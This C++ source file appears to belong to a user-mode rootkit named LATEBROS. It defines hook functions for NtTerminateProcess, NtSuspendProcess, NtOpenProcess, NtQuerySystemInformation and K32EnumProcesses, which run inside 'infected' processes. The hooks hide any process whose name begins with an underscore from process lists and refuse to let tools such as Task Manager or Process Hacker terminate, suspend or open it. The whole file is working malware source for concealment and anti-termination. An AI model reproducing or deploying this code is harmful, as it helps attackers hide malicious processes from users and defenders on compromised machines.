#include "stdafx.h"
#include "detour.hpp"

/*
* Function: ntdll!NtTerminateProcess
* Purpose: Protect any LATEBROS process from a rather unconventional way of termination
*
*/
typedef NTSTATUS(NTAPI *NtTerminateProcesss_t)(HANDLE ProcessHandle, NTSTATUS ExitCode);
extern "C" NTSTATUS __declspec(dllexport) NTAPI ntterm(HANDLE process_handle, NTSTATUS exit_code)
{
	// SOME APPLICATIONS (TASKMGR FOR EXAMPLE) OPEN SPECIFIC HANDLES WITH JUST THE REQUIRED RIGHTS
	// TO TERMINATE A PROCESS, BUT NOT ENOUGH TO QUERY A MODULE NAME
	// SO WE HAVE TO OPEN A TEMPORARY HANDLE WITH PROPER RIGHTS
	// SOMETIMES THEY OPEN A HANDLE WITH ONLY THE TERMINATE FLAG RIGHT (PROCESSHACKER FOR EXAMPLE)
	// WE CAN NOT DO ANYTHING ABOUT THIS, BUT WE ALREADY PREVENT OPENING HANDLE SO THIS IS ONLY
	// A FAIL SAFE

	auto process_id = GetProcessId(process_handle);
	auto temp_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, process_id);

	wchar_t name_buffer[MAX_PATH] = {};
	auto success = GetModuleBaseNameW(temp_handle, nullptr, name_buffer, MAX_PATH);

	// CLOSE HANDLE REGARDLESS OF OUTCOME TO PREVENT LEAKS
	CloseHandle(temp_handle);

	// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
	if (success && name_buffer[0] == L'_')
		return STATUS_ACCESS_DENIED; // RETURN ACCESS DENIED

	auto function_pointer = GetProcAddress(GetModuleHandleA("ntdll"), "NtTerminateProcess");
	return reinterpret_cast<NtTerminateProcesss_t>(function_pointer)(process_handle, exit_code);
}

/*
* Function: ntdll!NtSuspendProcess
* Purpose: Protect any LATEBROS process from a unconventional way of suspension
*
*/
typedef NTSTATUS(NTAPI *NtSuspendProcesss_t)(HANDLE ProcessHandle);
extern "C" NTSTATUS __declspec(dllexport) NTAPI ntsusp(HANDLE process_handle)
{
	// SOME APPLICATIONS (TASKMGR FOR EXAMPLE) OPEN SPECIFIC HANDLES WITH JUST THE REQUIRED RIGHTS
	// TO SUSPEND A PROCESS, BUT NOT ENOUGH TO QUERY A MODULE NAME
	// SO WE HAVE TO OPEN A TEMPORARY HANDLE WITH PROPER RIGHTS
	// SOMETIMES THEY OPEN A HANDLE WITH ONLY THE SUSPEND FLAG RIGHT (PROCESSHACKER FOR EXAMPLE)
	// WE CAN NOT DO ANYTHING ABOUT THIS, BUT WE ALREADY PREVENT OPENING HANDLE SO THIS IS ONLY
	// A FAIL SAFE	

	auto process_id = GetProcessId(process_handle);
	auto temp_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, process_id);

	wchar_t name_buffer[MAX_PATH] = {};
	auto success = GetModuleBaseNameW(temp_handle, nullptr, name_buffer, MAX_PATH);

	// CLOSE HANDLE REGARDLESS OF OUTCOME TO PREVENT LEAKS
	CloseHandle(temp_handle);

	// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
	if (success && name_buffer[0] == L'_')
		return STATUS_ACCESS_DENIED; // RETURN ACCESS DENIED

	auto function_pointer = GetProcAddress(GetModuleHandleA("ntdll"), "NtSuspendProcess");
	return reinterpret_cast<NtSuspendProcesss_t>(function_pointer)(process_handle);
}

/*
 * Function: ntdll!NtOpenProcess
 * Purpose: Disguise and protect any LATEBROS process by preventing client-id/process-id bruteforcing
 *
 */
typedef NTSTATUS(NTAPI *NtOpenProcess_t)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, _CLIENT_ID* ClientId);
extern "C" char __declspec(dllexport) ntop_og[0xE] = {}; // ORIGINAL BYTES
extern "C" NTSTATUS __declspec(dllexport) NTAPI ntop(PHANDLE out_handle, ACCESS_MASK desired_access, POBJECT_ATTRIBUTES object_attributes, _CLIENT_ID* client_id)
{
	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess"));

	// RESTORE
	detour::remove_detour(function_pointer, ntop_og, sizeof(ntop_og));

	// CALL
	reinterpret_cast<NtOpenProcess_t>(function_pointer)(out_handle, MAXIMUM_ALLOWED, object_attributes, client_id);

	// REHOOK
	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntop));

	wchar_t name_buffer[MAX_PATH] = {};
	if (GetModuleBaseNameW(*out_handle, nullptr, name_buffer, MAX_PATH))
	{
		// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
		if (name_buffer[0] == L'_')
		{
			CloseHandle(*out_handle);		// CLOSE HANDLE TO ENSURE IT WON'T BE USED REGARDLESS OF SANITY CHECKS
			*out_handle = 0;				// ERASE PASSED HANLDE
			return ERROR_INVALID_PARAMETER; // RETURN INVALID CLIENT_ID
		}
	}

	return ERROR_SUCCESS; // SUCCESS
}


/*
 * Function: ntdll!NtQuerySystemInformation
 * Purpose: Disguise any LATEBROS process by removing its respective process entry from the process list
 *
 */
typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;
extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS system_information_class, PVOID system_information, ULONG system_information_length, PULONG return_length)
{
	auto result = NtQuerySystemInformation(system_information_class, system_information, system_information_length, return_length);

	if (!NT_SUCCESS(result))
		return result;

	if (system_information_class == SystemProcessInformation
		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(53)/*SystemSessionProcessInformation*/
		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(57)/*SystemExtendedProcessInformation*/)
	{
		auto entry = reinterpret_cast<_SYSTEM_PROCESS_INFO*>(system_information);
		auto previous_entry = entry;

		while (entry->NextEntryOffset)
		{
			if (entry->ImageName.Buffer)
			{
				// SKIP PROTECTED ENTRIES
				if (entry->ImageName.Buffer[0] == L'_')
				{
					previous_entry->NextEntryOffset += entry->NextEntryOffset;	// MAKE PREVIOUS ENTRY POINT TO THE NEXT ENTRY
					ZeroMemory(entry, sizeof(_SYSTEM_PROCESS_INFO));			// CLEAR OUR ENTRY, WHY NOT?
				}
			}

			previous_entry = entry;
			entry = reinterpret_cast<_SYSTEM_PROCESS_INFO*>(reinterpret_cast<uintptr_t>(entry) + entry->NextEntryOffset);
		}
	}

	return result;
}


/*
 * Function: KERNEL32!K32EnumProcesses
 * Purpose: Disguise any LATEBROS process by removing its respective process id from the process list
 *
 */
extern "C" BOOL __declspec(dllexport) WINAPI enump(DWORD* process_ids, DWORD cb, DWORD* bytes_returned_ptr)
{
	if (!K32EnumProcesses(process_ids, cb, bytes_returned_ptr))
		return false; // NO NEED TO DO ANYTHING IF THE FUNCTION FAILS

    // PARSE ORIGINAL LIST
	auto process_list = std::unordered_set<DWORD>();
	for (size_t process_index = 0; process_index < *bytes_returned_ptr / sizeof(DWORD)/*ENTRY SIZE*/; process_index++)
		process_list.insert(process_ids[process_index]);

	// CLEAR ORIGINAL LIST
	ZeroMemory(process_ids, cb);

	// ITERATE NEW LIST, REMOVE ANY PROTECTED ENTRIES
	auto temp_process_list = process_list; // COPY TO PREVENT INVALIDATION, LAZY WAY
	for (const auto& process_id : temp_process_list)
	{
		auto handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, false, process_id);

		wchar_t name_buffer[MAX_PATH] = {};
		if (GetModuleBaseNameW(handle, nullptr, name_buffer, MAX_PATH))
		{
			// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROTECTED PROCESS
			if (name_buffer[0] == L'_')
			{
				process_list.erase(process_id);		  // REMOVE ITS ENTRY IN OUR LIST
				*bytes_returned_ptr -= sizeof(DWORD); // DECREMENT TOTAL SIZE
			}
		}

		CloseHandle(handle); // LEAKS ARE BAD
	}

	// REWRITE NEW LIST
	auto temp_vector = std::vector<DWORD>(process_list.begin(), process_list.end());
	memcpy(process_ids, temp_vector.data(), temp_vector.size() * sizeof(DWORD));

	return true;
}